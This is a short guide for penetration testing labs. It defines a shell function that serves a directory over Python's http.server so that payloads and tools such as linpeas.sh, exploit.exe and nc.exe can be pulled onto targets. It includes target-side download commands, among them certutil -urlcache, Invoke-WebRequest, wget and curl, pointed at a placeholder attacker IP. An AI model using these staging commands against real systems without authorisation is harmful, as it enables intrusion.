# Quick HTTP Server for Penetration Testing Labs (Python)

A minimal HTTP file transfer setup for penetration testing labs.  
Designed for **reliable file delivery** from Kali to targets in **local labs** and **VPN-based environments** (TryHackMe / HTB).

This setup prioritizes **speed, simplicity, and reliability** during lab and exam-style scenarios.

---

## 🎯 Use case

- Deliver files from Kali to a target
- Ideal for:
  - Payload delivery
  - Tool transfer
  - Script staging
- Works for:
  - Local labs (virt-manager / NAT)
  - TryHackMe / HTB targets via VPN (`tun0`)
- No authentication
- No system-wide installs
- Minimal noise and failure points

---

## 🧠 Design choices

- Uses Python’s built-in `http.server`
- Started via a shell alias (`httpstart`)
- Server listens on `0.0.0.0` (all interfaces)
- Shares **only** the current working directory (`pwd`)
- Alias prints both **LAN** and **VPN** IPs for clarity
- Intentionally unauthenticated for lab speed and simplicity

---

## 📦 One-time setup

No installation is required.

Python 3 is already present on Kali Linux.

---

## 🔧 Add alias to `~/.zshrc`

Open your shell configuration:

```bash
nano ~/.zshrc
````

Add the following block:

```bash
# ===============================
# Quick HTTP Server (python)
# ===============================
httpstart() {
  local PORT="${1:-8000}"

  local LANIP TUNIP
  LANIP="$(hostname -I | awk '{print $1}')"
  TUNIP="$(ip -4 -o addr show dev tun0 2>/dev/null | awk '{print $4}' | cut -d/ -f1)"

  echo "[+] HTTP server starting"
  echo "    Directory : $(pwd)"
  [[ -n "$LANIP" ]] && echo "    LAN       : http://$LANIP:$PORT/"
  [[ -n "$TUNIP" ]] && echo "    VPN       : http://$TUNIP:$PORT/"
  echo "    Stop with : CTRL+C"
  echo

  python3 -m http.server "$PORT"
}
```

Reload your shell:

```bash
source ~/.zshrc
```

---

## 🚀 Usage

### Start HTTP server (default)

```bash
httpstart
```

### Defaults

* Port: `8000`
* Directory: current working directory (`pwd`)

---

### Custom port

```bash
httpstart 8080
```

Change directory **before** starting the server.

---

## 📂 What is shared?

Only the directory from which `httpstart` is executed.

Example:

```text
~/loot/
├── linpeas.sh
├── exploit.exe
└── tools/
    └── nc.exe
```

Start the server:

```bash
cd ~/loot
httpstart
```

Available to the target:

```text
http://<KALI_IP>:8000/linpeas.sh
http://<KALI_IP>:8000/exploit.exe
http://<KALI_IP>:8000/tools/nc.exe
```

Nothing outside this directory is exposed.

---

## 🪟 Windows target examples

### PowerShell

```powershell
Invoke-WebRequest http://<KALI_IP>:8000/file.exe -OutFile file.exe
```

### Restricted environments

```text
certutil -urlcache -f http://<KALI_IP>:8000/file.exe file.exe
```

---

## 🐧 Linux target examples

```bash
wget http://<KALI_IP>:8000/file
```

or:

```bash
curl -O http://<KALI_IP>:8000/file
```

---

## 🔌 Which IP should be used?

### Local Windows VM

Use the **LAN IP**:

```text
192.168.122.x
```

### TryHackMe / HTB target

Use the **VPN IP** (`tun0`):

```text
10.x.x.x
192.168.x.x
```

The server listens on **all interfaces** (`0.0.0.0`).
The client must connect to an IP it can actually reach.

---

## 🧠 Penetration testing mindset

* Prefer **HTTP** whenever a target can download files
* Use **FTP** only when upload capability is required
* Avoid shared folders and GUI copy/paste shortcuts
* Choose transfer methods based on:

  * Routing
  * VPN reachability
  * Reliability
  * Target limitations

---

## ✅ Summary

* Zero setup
* One command (`httpstart`)
* Shares only the current working directory
* Clean, reliable, and low-noise
* Ideal for VPN-based penetration testing labs
